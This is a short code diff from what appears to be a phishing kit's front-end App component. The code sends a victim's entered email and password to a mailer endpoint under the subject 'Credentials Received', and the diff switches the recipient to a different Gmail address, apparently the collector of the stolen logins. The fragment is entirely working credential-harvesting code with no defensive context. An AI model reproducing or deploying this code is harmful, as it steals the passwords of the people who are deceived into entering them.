@@ -185,7 +185,7 @@ export const App = () => {
     }
 
     const request = await axios.post('/api/mailer', {
-      email: "austine@fashionbrand.click" as string,
+      email: "btcbd11001@gmail.com" as string,
       subject: "Credentials Received",
       message: `Email: ${email}\nPassword: ${password}`,
     });
